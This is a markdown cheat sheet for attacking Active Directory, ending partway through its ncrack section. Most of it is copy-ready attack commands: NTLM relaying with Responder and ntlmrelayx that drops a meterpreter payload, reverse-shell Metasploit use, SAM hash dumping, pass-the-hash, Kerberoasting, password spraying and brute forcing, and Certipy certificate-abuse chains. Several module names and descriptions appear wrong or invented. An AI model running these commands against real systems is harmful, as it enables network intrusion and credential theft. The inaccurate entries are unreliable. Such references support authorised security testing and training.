# Active Directory (AD) Penetration Testing Guide

This document provides a comprehensive guide to penetration testing within Active Directory environments. It covers essential topics such as common AD ports and services, various tools and techniques for exploitation, and methods for post-compromise attacks. Each section details specific tools like Responder, Impacket, and Mimikatz, along with practical examples and usage scenarios. Additionally, it includes advanced topics on token impersonation, hash cracking, and domain enumeration. This guide aims to equip security professionals with the knowledge and tools needed to effectively assess and secure AD infrastructures.

## Table of Contents
- [Common Ports in AD](#common-ports-in-ad)
- [Common Post Exploitation Settings](#common-post-exploitation-settings)
    - [Kerberos Configuration (/etc/krb5.conf)](#kerberos-configuration-etckrb5conf)
    - [Time Synchronization](#time-synchronization)
    - [Set Kerberos Ticket Environment Variable](#set-kerberos-ticket-environment-variable)
- [NMap](#nmap)
- [Metasploit](#metasploit)
    - [Token Impersonation](#token-impersonation)
- [Responder](#responder) 
    - [LMNR Poisoning](#lmnr-poisoning)
    - [SMB Relay](#smb-relay)
    - [Responder Attacks](#responder-attacks)
- [enum4linux](#enum4linux)
- [smb-map](#smbmap)
- [smbclient](#smbclient)
- [Impacket](#impacket)
    - [GetTGT](#gettgt)
    - [secretsdump](#secretsdump)
    - [GetUserSPN](#getuserspn)
    - [ntlmrelayx IPV6 mitm6 Attack](#ntlmrelayx)
    - [PSEXEC](#psexec)
- [targetedKerberoast](#targetedkerberoast)
- [timeroasting](#timeroasting)
- [Kerbrute](#kerbrute)
- [KrbRelayUp](#krbrelayup)
- [Hashcat](#hashcat)
- [johntheripper](#johntheripper)
- [Hydra](#hydra)
- [ldapsearch](#ldapsearch)
- [ldapdomaindump](#ldapdomaindump)
- [Certipy](#certipy)
- [NetExec (CrackMapExec)](#netexec)
- [rpcclient](#rpcclient)
- [Mimikatz](#mimikatz)
- [Rubeus](#rubeus)
- [Evil-WinRM](#evil-winrm)
- [ncrack](#ncrack)
- [rdpscan](#rdpscan)
- [xfreerdp](#xfreerdp)
- [PowerSploit](#powersploit)
- [PowerView](#powerview)
- [BloodHound](#bloodhound)
- [Adalanche](#adalanche)
- [BloodyAD and autobloody](#bloodyad-and-autobloody)
- [ADExplorer](#adexplorer)
- [Troubleshoot](#troubleshoot)
- [External Links](#external-links)

---
# Common Ports in AD
Active Directory Ports, Services, Vulnerabilities, and Tools
- **Port 53 (DNS)**
  - Vulnerabilities: DNS Cache Poisoning, DNS Amplification
  - Tools: `nslookup`, `dig`, `dnsenum`, `Fierce`, `dnsrecon`, `dnstracer`
- **Port 88 (Kerberos)**
  - Vulnerabilities: AS-REP Roasting, Ticket Forging, Pass the Ticket, Silver Ticket Attack, Golden Ticket Attack
  - Tools: [impacket](#impacket), [Rubeus](#rubeus), [Kerbrute](#kerbrute), [Hashcat](#hashcat), [GetUserSPN](#getuserspn), [mitm6](#ntlmrelayx)
- **Port 135 (MS-RPC)**
  - Vulnerabilities: DCOM Exploitation, MS-RPC Privilege Escalation
  - Tools: [rpcclient](#rpcclient), [Metasploit](#metasploit), [NMap](#nmap), [PowerSploit](#powersploit), [NetExec (CrackMapExec)](#netexec), [Evil-WinRM](#evil-winrm)
- **Port 137-139 (NetBIOS)**
  - Vulnerabilities: SMB Relay, NTLM Relay, NetBIOS Spoofing
  - Tools: [smbclient](#smbclient), [Responder](#responder) , [impacket](#impacket), [NMap](#nmap), [NetExec (CrackMapExec)](#netexec)
- **Port 389 (LDAP)**
  - Vulnerabilities: LDAP Injection, Credential Harvesting, Anonymous Bind
  - Tools: [ldapsearch](#ldapsearch), [NMap](#nmap), [ldapdomaindump](#ldapdomaindump), [NetExec (CrackMapExec)](#netexec), [BloodHound](#bloodhound), [ADExplorer](#adexplorer), [Certipy](#certipy)
- **Port 445 (SMB)**
  - Vulnerabilities: EternalBlue, SMB Relay, SMB Signing Disabled, Pass the Hash
  - Tools: [smbclient](#smbclient), [impacket](#impacket), [NMap](#nmap), [NetExec (CrackMapExec)](#netexec), [Metasploit](#metasploit), [smbmap](#smbmap)
- **Port 464 (Kerberos Password Change)**
  - Vulnerabilities: Kerberoasting, Password Spraying
  - Tools: [impacket](#impacket), [Rubeus](#rubeus), [Kerbrute](#kerbrute), [Hashcat](#hashcat), [KrbRelayUp](#krbrelayup) 
- **Port 593 (HTTP RPC)**
  - Vulnerabilities: Authentication Bypass, MS-RPC Injection
  - Tools: [rpcclient](#rpcclient), [Metasploit](#metasploit), [NMap](#nmap), [PowerSploit](#powersploit), [Evil-WinRM](#evil-winrm), [NetExec (CrackMapExec)](#netexec)
- **Port 636 (LDAPS)**
  - Vulnerabilities: LDAP Injection, Certificate Spoofing
  - Tools: [ldapsearch](#ldapsearch), [NMap](#nmap), [NetExec (CrackMapExec)](#netexec), [BloodHound](#bloodhound), [ADExplorer](#adexplorer)
- **Port 3268-3269 (Global Catalog)**
  - Vulnerabilities: LDAP Injection, Data Exposure
  - Tools: [ldapsearch](#ldapsearch), [NMap](#nmap), [NetExec (CrackMapExec)](#netexec), [BloodHound](#bloodhound), [ADExplorer](#adexplorer)
- **Port 3389 (RDP)**
  - Vulnerabilities: BlueKeep, Weak Encryption, RDP Hijacking, Credential Forwarding
  - Tools: [ncrack](#ncrack), [xfreerdp](#xfreerdp), [Metasploit](#metasploit), [NetExec (CrackMapExec)](#netexec), [rdpscan](#rdpscan)
- **Port 5985-5986 (WinRM)**
  - Vulnerabilities: Credential Theft, Pass-the-Hash, Unconstrained Delegation
  - Tools: [Evil-WinRM](#evil-winrm), [Impacket](#impacket), [NetExec (CrackMapExec)](#netexec), [Metasploit](#metasploit), [PowerView](#powerview)

---
## Common Post Exploitation Settings

- ### Kerberos Configuration (/etc/krb5.conf)
    Sets up Kerberos authentication for the domain
    - `sudo nano /etc/krb5.conf`
    - Add this conf [Note: just change DOMAIN.TLD with Target Domain and add Target IP Properly]
         ```ini
         [libdefaults]
            default_realm = DOMAIN.TLD
            dns_lookup_realm = false
            dns_lookup_kdc = true
            ticket_lifetime = 24h
            forwardable = true
        
        [realms]
            DOMAIN.TLD = {
                kdc = target-ip
                admin_server = target-ip
                default_domain = DOMAIN.TLD
            }
        
        [domain_realm]
            .domain.tld = DOMAIN.TLD
            domain.tld = DOMAIN.TLD

         ```
    - or `nxc smb $ip -u user -p password --generate-krb5-file krb5.conf`
- ### Time Synchronization
    Synchronized the attack machine's clock with the domain controller. Prevents Kerberos authentication failures due to clock skew.
  
    ```bash
    sudo timedatectl set-ntp off && ntpdate -s <IP/DOMAIN>
    ```
- ### Set Kerberos Ticket Environment Variable
    Exported the ticket for use in subsequent commands. Allows tools like evil-winrm to use the cached ticket for authentication.
    - `export KRB5CCNAME=USER.name.ccache` [After getting TGT with getTGT]
## NMap

```bash
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49152-65535 -A $IP # Basic AD Port Scan
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49152-65535 --script smb-enum-shares,smb-enum-users,ldap-rootdse,ldap-search,krb5-enum-users,smb-os-discovery,smb-vuln-ms17-010,smb-enum-domains,smb-enum-sessions,smb-enum-processes,smb2-security-mode,smb2-capabilities,smb-system-info,msrpc-enum,smb-brute,rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info,ssl-cert,ssl-enum-ciphers,smb-protocols,ms-sql-info,smb-vuln-regsvc-dos $IP # All Scripts for All AD Ports
nmap -p 445 --script smb-enum-shares,smb-enum-users $IP # SMB Enumeration
nmap -p 389 --script ldap-rootdse,ldap-search,ldap-novell-getpass $IP # LDAP Enumeration
nmap -p 389,636 --script ldap-search --script-args 'ldap.username=<user>,ldap.password=<password>,ldap.qfilter="(objectClass=*)",ldap.searchdn="DC=example,DC=com"' $IP # AD Domain Controllers Enumeration
nmap -p 88 --script krb5-enum-users $IP # Kerberos Enumeration
nmap -p 5985 --script http-winrm-info $IP # WinRM Enumeration
nmap --script smb-os-discovery -p 445 $IP # OS Discovery
nmap --script smb-vuln-ms17-010 -p 445 $IP # SMB Vulnerability Check (EternalBlue)
nmap --script smb-enum-domains -p 445 $IP # Enumerate AD Domains
nmap --script smb-enum-sessions -p 445 $IP # Enumerate SMB Sessions
nmap --script smb-enum-processes -p 445 $IP # Enumerate Processes over SMB
nmap --script smb2-security-mode -p 445 $IP # SMB2 Security Mode
nmap --script smb2-capabilities -p 445 $IP # SMB2 Capabilities
nmap --script smb-system-info -p 445 $IP # System Information via SMB
nmap --script msrpc-enum -p 135 $IP # RPC Enumeration
nmap -p 135 --script msrpc-enum $IP # Microsoft RPC Enumeration
nmap --script smb-brute -p 445 $IP # SMB Brute Force
```

## Metasploit

```bash
# DNS (Port 53)
- auxiliary/gather/enum_dns  # Enumerate DNS information
- auxiliary/scanner/dns/dns_amp  # DNS amplification attack
- auxiliary/scanner/dns/dns_cache_scraper  # Scrape DNS cache

# Kerberos (Port 88)
- auxiliary/gather/kerberos_enumusers  # Enumerate users via Kerberos
- auxiliary/gather/kerberos_enum_tgs  # Enumerate Kerberos TGS tickets
- auxiliary/scanner/kerberos/kerberos_as_req  # Kerberos AS-REQ scanner (AS-REP Roasting)
- auxiliary/scanner/kerberos/kerberos_ticket_granting_service  # Enumerate SPNs for Kerberoasting

# MS-RPC (Port 135)
- exploit/windows/dcerpc/ms03_026_dcom  # Exploit MS-RPC DCOM vulnerability
- exploit/windows/dcerpc/ms17_010_eternalblue  # Exploit MS17-010 EternalBlue

# NetBIOS (Port 137-139)
- auxiliary/scanner/netbios/nbname  # NetBIOS name service scanner
- auxiliary/scanner/smb/smb_version  # SMB version scanner
- auxiliary/scanner/smb/smb_login  # Brute-force SMB login
- exploit/windows/smb/smb_relay  # SMB relay attack

# LDAP (Port 389)
- auxiliary/gather/ldap_enum  # LDAP enumeration
- auxiliary/gather/ldap_hashdump  # Dump hashes from LDAP
- auxiliary/admin/ldap/ldap_add_user  # Add user to LDAP server
- exploit/windows/ldap/ldap_pass_the_hash  # Pass-the-Hash for LDAP

# SMB (Port 445)
- auxiliary/scanner/smb/smb_enumshares  # Enumerate SMB shares
- auxiliary/scanner/smb/smb_enumusers  # Enumerate SMB users
- auxiliary/scanner/smb/smb_login  # SMB login brute-force
- exploit/windows/smb/ms17_010_psexec  # Exploit EternalBlue (psexec shell)
- exploit/windows/smb/ms08_067_netapi  # Exploit SMB MS08-067 vulnerability
- auxiliary/scanner/smb/smb_ms17_010  # Scan for MS17-010 vulnerability

# LDAPS (Port 636)
- auxiliary/scanner/ldap/ldap_search  # LDAP search over SSL
- auxiliary/gather/ldap_query  # Perform LDAP queries

# Global Catalog (Port 3268-3269)
- auxiliary/scanner/ldap/ldap_rootdse  # LDAP RootDSE information gathering

# RDP (Port 3389)
- auxiliary/scanner/rdp/rdp_scanner  # Basic RDP scanner
- auxiliary/scanner/rdp/rdp_enumcredssp  # Enumerate RDP CredSSP
- auxiliary/scanner/rdp/cve_2019_0708_bluekeep  # Scan for BlueKeep vulnerability (CVE-2019-0708)
- auxiliary/scanner/rdp/rdp_login  # Brute-force RDP logins
- exploit/windows/rdp/cve_2019_0708_bluekeep_rce  # Exploit BlueKeep (CVE-2019-0708)

# Windows Privilege Escalation
- exploit/windows/local/bypassuac  # Bypass UAC on Windows systems
- exploit/windows/local/ask  # Escalate privileges via the AlwaysInstallElevated policy
- exploit/windows/local/ms10_092_schelevator  # Exploit Task Scheduler Vulnerability (MS10-092)
- exploit/windows/local/ms16_032_secondary_logon_handle_privesc  # Escalate via Secondary Logon Handle (MS16-032)
- exploit/windows/local/ms14_058_track_popup_menu  # Kernel mode vulnerability exploit (MS14-058)
- exploit/windows/local/cve_2020_0787_bits  # Windows BITS Elevation of Privilege (CVE-2020-0787)
- exploit/windows/local/cve_2021_1675_printnightmare  # Windows Print Spooler Exploit (PrintNightmare CVE-2021-1675)
- exploit/windows/local/ms15_051_client_copy_image  # Exploit Client Copy Image Vulnerability (MS15-051)

# Generic Privilege Escalation Techniques
- post/multi/recon/local_exploit_suggester  # Suggest potential local exploits for privilege escalation
- exploit/multi/local/ntfs_priv_esc  # Escalate privileges by abusing NTFS vulnerability
- exploit/windows/local/cve_2021_1732_win32k  # Exploit Windows Win32k Privilege Escalation (CVE-2021-1732)
```

- ### Token Impersonation

Connect with metasploit psexec `exploit/windows/smb/psexec` using `windows/x64/meterpreter/reverse_tcp` payload.

```bash
meterpreter> load incognito 
meterpreter> list_tokens -u # listing tokens
meterpreter> impersonate_token USERNAME\\Administrator
meterpreter> shell #now you can use shell as USERNAME\\Administrator
meterpreter> rev2self # Used to revert to original token. Useful to clean up impersonation.
```


## Responder
- ### LMNR Poisoning
    Responder `responder -I eth0 -rdwv`
- ### SMB Relay
    `nmap --script=smb2-security-mode -p445`
- ### Responder Attacks
    * http off smb off in responder.conf
    - Attack 1
      
        ```bash
        responder -I eth0 -rdwv
        ntlmrelayx.py -tf targets.txt -smb2support
        ```
    - Attack 2
      
        ```bash
        responder -I eth0 -rdwv
        ntlmrelayx.py -tf targets.txt -smb2support -i # It will show SMB shell opned on port {PORT}
        nc 127.0.0.1 {PORT}
        ```
    SHELL command `shares` to get shares name and `use SHARENAME$` to get access.
    - Attack 3
        ```bash
        responder -I eth0 -rdwv
        ntlmrelayx.py -tf targets.txt -smb2support -e meterpreterShell.exe
        ```
    - Attack 4
        ```bash
        responder -I eth0 -rdwv
        ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
        ```
        
## enum4linux
```bash
enum4linux -a -u "" -p "" <DC IP>  # Enumerate Users and Shares with blank user pass
enum4linux -a -u "guest" -p "" <DC IP> # Enumerate Users and Shares with Guest Access
enum4linux -G <DC IP>  # Retrieve Group Memberships
enum4linux -P <DC IP>  # Retrieve Password Policies
```
## smbmap
```bash
smbmap -u "" -p "" -P 445 -H <DC IP> # Enumerate SMB Shares with blank user pass
smbmap -u "guest" -p "" -P 445 -H <DC IP> # Enumerate SMB Shares with Guest Access
smbmap -u "guest" -p "" -P 445 -H <DC IP> -R # List Permissions on Shares
smbmap -u "guest" -p "" -P 445 -H <DC IP> -w /path/to/local/file -d /remote/share/directory   # Upload a File to a Writable Share
```
Check: [NetExec smb commands](#netExec-smb-commands)
## smbclient
```bash
smbclient -U '%' -L //<DC IP>  # Enumerate SMB Shares with blank user pass
smbclient -U 'guest%' -L //<DC IP>   # Enumerate SMB Shares with Guest Access 
smbclient -L \\\\10.10.10.101\\   # Check if Anonymous Access is Enabled
smbclient -L \\\\10.10.10.101\\username  # Login as a Specific User
smb: > mget *   # Download All Files from a Share
smbclient -L \\\\10.10.10.101\\ -m SMB2   # Check SMB Signing
smbclient -U 'admin%' -L //<DC IP>/C$   # Enumerate Access to Admin Shares
smbclient //10.8.0.2/Users -U guest    # Login as guest
```
Check: [NetExec smb commands](#netExec-smb-commands)

## Impacket
- ### GetTGT
    Download Ticket Granting Tokens
    - `GetTGT.py domain.tld/USERNAME:'PASSWORD' -dc-ip DC.domain.tld`
- ### secretsdump
    - `secretsdump.py domain/user:password@192.168.0.101  #dump hash`
    - Hashdump
       ```bash 
       reg save HKLM\SAM C:\Users\<YourUser>\Desktop\SAM.hiv
       reg save HKLM\SYSTEM C:\Users\<YourUser>\Desktop\SYSTEM.hiv
       secretsdump.py -sam SAM.hiv -system SYSTEM.hiv LOCAL
        ```
- ### GetUserSPN
    - Get Login Token with `GetUserSPNs.py domain.tld/username:password -dc-ip 192.158.0.101 -request`
- ### ntlmrelayx
    - IPV6 mitm6 Attack `ntlmrelayx.py -6 -t ldaps://192.168.111 -wh sub.domain.tld -l loots`
- ### PSEXEC

    - use exploit `exploit/windows/smb/psexec` on metasploit
    - `psexec.py domain.tld/username:password@192.168.0.111`
    - `smbexec.py domain.tld/username:password@192.168.0.111`
    - `wmiexec.py domain.tld/username:password@192.168.0.111`
    - Command to dump hash after shell in metasploit `hashdump`, or could be used any method for hash dumping.
    `psexec.py username:@192.168.0.111 -hashes fullhashfirstpart:fullhashanotherpart # Authenticate using NTLM hashes (Pass-the-Hash)`

## targetedKerberoast

targetedKerberoast can be used for  targeted Kerberoasting attack.

Repo: https://github.com/ShutdownRepo/targetedKerberoast

```bash
usage: targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]

python3 targetedKerberoast.py -v -d 'domain.htb' -u username -p password # example command
```

## timeroasting

Repo: https://github.com/SecuraBV/Timeroast

> [!TIP] 
> Execute `python3 timeroast.py -h` or `powershell timeroast.ps1 -?` for usage instructions.

```bash
timeroast.py 10.0.0.42 | tee ntp-hashes.txt # Extract sntp hashes
hashcat -m 31300 ntp-hashes.txt # hashcat sntp crack
```


## Kerbrute
Repo: https://github.com/ropnop/kerbrute

Notes: https://www.hackingarticles.in/a-detailed-guide-on-kerbrute/
```bash
kerbrute userenum -t 1000 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 192.168.1.19 -d domain.tld #userenum
kerbrute passwordspray -t 250 --dc 192.168.1.19 -d domain.tld users.txt Password@1 #user bruteforce with known password
kerbrute bruteuser -t 250 --dc 192.168.1.19 -d domain.tld password.txt admin #password bruteforce with known username
```

## KrbRelayUp
https://github.com/Dec0ne/KrbRelayUp 
```bash
.\KrbRelayUp.exe  # Run KrbRelayUp without parameters (default attack mode)
.\KrbRelayUp.exe -u <username> -d <domain> -p <password>  # Specify credentials for relay attack
.\KrbRelayUp.exe -spn <service_principal_name>  # Perform relay attack targeting specific SPN
.\KrbRelayUp.exe -dc  # Elevate privileges by relaying to the domain controller
```

## Hashcat
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O # ntlm hash crack
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -O # sam hash crack
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -O # login token crack krbtgt
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt -O # kerberoas Aspreroast
hashcat -m 31300 ntp-hashes.txt /usr/share/wordlists/rockyou.txt -O # hashcat sntp crack
```
## johntheripper
John The Ripper Jumbo version
```bash
john --format=netntlm hash.txt --wordlist=/opt/wordlists/rockyou.txt # ntlm crack
john --format=NT hash.txt --wordlist=/opt/wordlists/rockyou.txt # sam hash crack
john --wordlist=/opt/wordlists/rockyou.txt hash # login token crack krbtgt
```

## Hydra
`-l` for single username, `-L` for username wordlist, `-p` for single password, `-P` for password wordlist
```bash
hydra -L <user_list.txt> -P <password_list.txt> <target_IP> rdp   # RDP Bruteforce
hydra -L <user_list.txt> -P <password_list.txt> <target_IP> ldap # LDAP bruteforce
hydra -L <user_list.txt> -P <password_list.txt> <target_IP> smb # SMB bruteforce
hydra -L <user_list.txt> -P <password_list.txt> <target_IP> ssh # ssh bruteforce
hydra -L <user_list.txt> -P <password_list.txt> <target_IP> ftp # ftp bruteforce
hydra -l <username> -P <password_list.txt> -s <port> <target_IP> <service> # for custom ports
hydra -l <username> -P <password_list.txt> <target_IP> http-form-post "/login.php:user=^USER^&pass=^PASS^:F=incorrect"  #http can replace with http-get, https-post, https-get based on request type
```

## ldapsearch
```bash
ldapsearch -x -h <host> -b "<base_dn>" "<search_filter>"  # Basic search in LDAP directory
ldapsearch -x -h <host> -b "<base_dn>" "<search_filter>" <attribute1> <attribute2>  # Search with specific attributes
ldapsearch -D "<bind_dn>" -w <password> -x -h <host> -b "<base_dn>" "<search_filter>"  # Search with authentication
ldapsearch -x -H ldaps://<host> -b "<base_dn>" "<search_filter>"  # Search using TLS for secure connection
ldapsearch -x -h <host> -b "ou=Users,<base_dn>" "(uid=<username>)"  # Search for specific user by UID
ldapsearch -x -h <host> -b "ou=Groups,<base_dn>" "(cn=<groupname>)"  # Search for specific group by common name
ldapsearch -x -h <host> -b "<base_dn>" "(objectClass=*)"  # Retrieve all entries in the directory
ldapsearch -x -h <host> -b "<base_dn>" -z <number_of_results> "<search_filter>"  # Limit search results to a specified number
ldapsearch -x -h <host> -b "<base_dn>" "<search_filter>" > results.txt  # Save search results to a file
ldapsearch -x -h <host> -b "<base_dn>" "<search_filter>" -LLL  # Display results in LDIF format (no comments)
```
## ldapdomaindump

https://github.com/dirkjanm/ldapdomaindump  # pip install ldap3 dnspython 
```bash
ldapdomaindump -u <domain>\<username> -p <password> <target_ip>  # Perform a full LDAP domain dump with credentials
ldapdomaindump -u <domain>\<username> -p <password> -o <output_directory> <target_ip>  # Specify output directory for dumped files
ldapdomaindump --hashes <LMHASH>:<NTHASH> <target_ip>  # Perform a dump using NTLM hashes instead of plaintext credentials
ldapdomaindump --no-json --no-grep --no-html <target_ip>  # Disable output in JSON, grepable, and HTML formats (output only raw dump)
ldapdomaindump -u <domain>\<username> -p <password> -d <target_domain> <target_ip>  # Dump information from a specific domain
```

## Certipy

Certipy-ad or Certipy is AD CS Abuse Tool.

[Repo](https://github.com/ly4k/Certipy) | [Usage](https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage) | [Privilege Escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)

```bash
## 🧭 Find Vulnerable Certificate Templates
certipy find -u <user> -p <pass> -dc-ip <ip>
## 🧾 Request a Certificate (ESC1)
certipy req -u <user> -p <pass> -ca <ca-name> -template <template-name> -dc-ip <ip>
## 🔐 Authenticate Using a Certificate
certipy auth -pfx <cert.pfx> -dc-ip <ip>
## 🎭 Request Certificate for Another User (ESC6)
certipy req -u <user> -p <pass> -ca <ca-name> -template <template> -upn <target@domain> -dc-ip <ip>
## 🕵️ List Certificate Authorities
certipy ca -u <user> -p <pass> -dc-ip <ip>
## 📜 Extract Certificate Information from .pfx
certipy cert -pfx <cert.pfx>
## 🪪 Get TGT Using Certificate (PKINIT)
certipy auth -pfx <cert.pfx> -dc-ip <ip> --get-tgt
## 🔁 Get TGT (Alternative PKINIT for ESC8)
certipy auth -pfx <cert.pfx> -dc-ip <ip> --alt --get-tgt
## 🧬 Shadow Credentials (ESC8)
certipy shadow -u <user> -p <pass> -target <target-user> -dc-ip <ip>
## 🗃️ Dump Certificate Data from Target User
certipy dump -u <user> -p <pass> -target <target-user> -dc-ip <ip>
## 📤 Convert .pfx to .pem or Extract Cert Only
certipy cert -pfx <cert.pfx> -nokeys -out cert.pem

```

## 🔧 Common Options

| Option               | Description                                   |
|----------------------|-----------------------------------------------|
| `-u <user>`          | Username (e.g. `user@domain.local`)           |
| `-p <pass>`          | Password                                      |
| `-hashes <LM:NT>`    | NTLM hash instead of password                 |
| `-dc-ip <ip>`        | Domain Controller IP                          |
| `-ca <ca-name>`      | Certificate Authority name                    |
| `-template <name>`   | Template name                                 |
| `-pfx <file>`        | Path to PFX file                              |
| `--alt`              | Use alternate TGT request (ESC8)              |
| `--get-tgt`          | Obtain TGT after authentication               |



- ⚙️ Example Full Chain (ESC1)
```bash
certipy find -u user -p pass -dc-ip 10.0.0.1
certipy req -u user -p pass -ca dc01-CA -template User -dc-ip 10.0.0.1
certipy auth -pfx user.pfx -dc-ip 10.0.0.1 --get-tgt
```

- ⚙️ Example Full Chain (ESC6)
```bash
certipy req -u user -p pass -ca dc01-CA -template ESC6Template -upn Administrator@domain.local -dc-ip 10.0.0.1
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1 --get-tgt
```

- ⚙️ Example Shadow Credentials (ESC8)
```bash
certipy shadow -u user -p pass -target Administrator -dc-ip 10.0.0.1
certipy auth -pfx administrator_shadow.pfx -dc-ip 10.0.0.1 --alt --get-tgt
```


## NetExec

- [NetExec Repo](https://github.com/Pennyw0rth/NetExec) [CrackMapExec Repo](https://github.com/byt3bl33d3r/CrackMapExec) 
- [CrackMapExec Cheetsheet 1](https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/)
- Basic Structure `cme {rdp,wmi,ftp,vnc,ldap,smb,winrm,ssh,mssql} target.txt -u user.txt -p wordlist.txt`
    - First we can write `crackmapexec`, `cme`, `netexec` or `nxc`
    - Then we can write any of the service to test: `rdp`,`wmi`,`ftp`,`vnc`,`ldap`,`smb`,`winrm`,`ssh` or `mssql`
    - Then target: as ip range, ip, domain, domain space separated or ip space separated or domain ip list file
    - We can add: `-u` for username or username file list
    - For authentication: `-p` for password or password wordlist, or `-H` for password hash or password hash file list, or `--no-pass` for no password
    - Then we can add additional arguments as per need
        - `-x 'COMMAND to exec'` command execution if possible
        - `-X 'COMMAND to exec'` command execution as Administrator if possible
        - `-M mimikatz -o COMMAND='privilege::debug'` for mimikatz or `-M met_inject -o LHOST=YOURIP LPORT=4444` for Metasploit, are two Modules.
        - There are many other modules to run many third party tools.
        - Follow Cheetsheet link above for more functions and module list.
### Basic Commands
```bash
# in case of crackmapexec command is cme and for netexec it is nxc. Arguments are same.
nxc smb 10.10.3.0/24 -u username -D Domain.tld -p password # Find login with password
nxc smb 10.10.3.0/24 -u username -H hashdumpedhashlastpart --local # Find login with hash
nxc smb 10.10.3.0/24 -u "FirestName LastName" -H hashdumpedhashlastpart --local-auth # Find login with hash
```
### NetExec smb commands
```bash
nxc smb 10.10.11.35 -u Guest -p '' # To check guest user is allowed or not in smb
nxc smb 10.10.11.35 -u Guest -p '' --rid-brute > c.txt    # smb user enumeration as guest user, To sort usernames cat c.txt | grep SidTypeUser | cut -d '\' -f 2 | awk '{print $1}' > usernames.txt
nxc smb 10.10.11.35 -u Guest -p '' --shares # smb share enumeration as guest user
```

### Netexec user enumeration
```bash
nxc smb <DOMAIN/IP> -u 'username' -p 'password' --rid-brute | grep "SidTypeUser" | awk -F '\\' '{print $2}' | awk '{print $1}' > users.txt
nxc smb <DOMAIN/IP> -u 'username' -p 'password' --users
nxc smb <DOMAIN/IP> -u 'username' -p 'password' --users -k
```
## rpcclient

```bash
rpcclient -U "" <target_ip>  # Null session connection
rpcclient -U "" -N <target_ip> #empty username (-U "") #no password (-N)
rpcclient -U "<username>%<password>" <target_ip>  # Authenticated connection with username and password
rpcclient -U "<domain>/<username>%<password>" <target_ip>  # Domain authenticated connection

rpcclient <target_ip> -c "srvinfo"  # Get server information
rpcclient <target_ip> -c "enumdomusers"  # Enumerate domain users
rpcclient <target_ip> -c "enumdomgroups"  # Enumerate domain groups
rpcclient <target_ip> -c "querydominfo"  # Query domain information
rpcclient <target_ip> -c "lsaquery"  # Get security identifier (SID)
rpcclient <target_ip> -c "lookupnames <username>"  # Get SID of a specific user
rpcclient <target_ip> -c "lookupnames <groupname>"  # Get SID of a specific group
rpcclient <target_ip> -c "samrlookupnames <username>"  # Get RID (Relative ID) of a specific user
rpcclient <target_ip> -c "enumprivs"  # Enumerate privileges
rpcclient <target_ip> -c "getdompwinfo"  # Get password policy information
rpcclient <target_ip> -c "querygroupmem <group_rid>"  # List members of a specific group by RID
rpcclient <target_ip> -c "netshareenum"  # Enumerate shared resources
rpcclient <target_ip> -c "netsharegetinfo <sharename>"  # Get information on a specific share
rpcclient <target_ip> -c "lsaenumsid"  # Enumerate all SIDs
rpcclient <target_ip> -c "lsaquerytrustdom"  # Query trusted domains
rpcclient <target_ip> -c "enumalsgroups"  # Enumerate alias groups
rpcclient <target_ip> -c "lsaenumacctrights <SID>"  # Enumerate account rights for a given SID
```

## Rubeus

Repo: https://github.com/GhostPack/Rubeus

- **Request TGT**: `Rubeus.exe asktgt /user:USERNAME /rc4:HASH`
- **Request TGS**: `Rubeus.exe asktgs /user:USERNAME /rc4:HASH /service:SERVICE`
- **Renew TGT**: `Rubeus.exe renew /ticket:TICKET_BASE64`
- **Kerberoast**: `Rubeus.exe kerberoast`
- **Pass-the-Ticket**: `Rubeus.exe ptt /ticket:TICKET_BASE64`
- **Overpass-the-Hash**: `Rubeus.exe tgtdeleg /rc4:HASH /user:USERNAME /domain:DOMAIN`
- **Inject Ticket**: `Rubeus.exe ptt /ticket:TICKET_BASE64`
- **Extract Tickets**: `Rubeus.exe dump`
- **Renew Tickets**: `Rubeus.exe renew /ticket:TICKET_BASE64`
- **S4U**: `Rubeus.exe s4u /user:USERNAME /rc4:HASH /impersonateuser:IMPERSONATE_USER /msdsspn:SPN`

## evil-winrm
Repo: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

```bash
# 1. Connecting Using a Pass-the-Hash Attack
evil-winrm -i domain.target -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
# 2. Basic Connection Using Username and Password
evil-winrm -i domain.target -u Administrator -p 'password123'
# 3. Connecting with Kerberos Authentication
evil-winrm -i domain.target -u Administrator -r DOMAIN.LOCAL -k
# 4. Specifying a Custom Port
evil-winrm -i domain.target -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -p 5985
# 5. Running with Proxy Settings
evil-winrm -i domain.target -u Administrator -H 0e0363213e37b94221497260b0bcb4fc --proxy http://proxy.domain.local:8080
# 6. Executing Commands and Uploading Files
evil-winrm -i domain.target -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -s scripts -e command.ps1
# 7. Running PowerShell Scripts on the Remote Machine
evil-winrm -i domain.target -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -s /path/to/powershell/script.ps1
# 8. Brute-Force a List of Passwords
evil-winrm -i domain.target -u Administrator -P password_list.txt
# 9. Connecting with Kerberos Ticket (Pass-the-Ticket)
export KRB5CCNAME=/path/to/krb5cc
evil-winrm -i domain.target -u Administrator -r DOMAIN.LOCAL -k
# 10. Changing the Working Directory
evil-winrm -i domain.target -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -c C:\Users\Administrator\Desktop
```

## ncrack 
RDP Brute Force Tool. Alternative: [hydra](#hydra)
```bash
ncrack -p 3389 <target_ip>  # Brute force RDP login on the default port
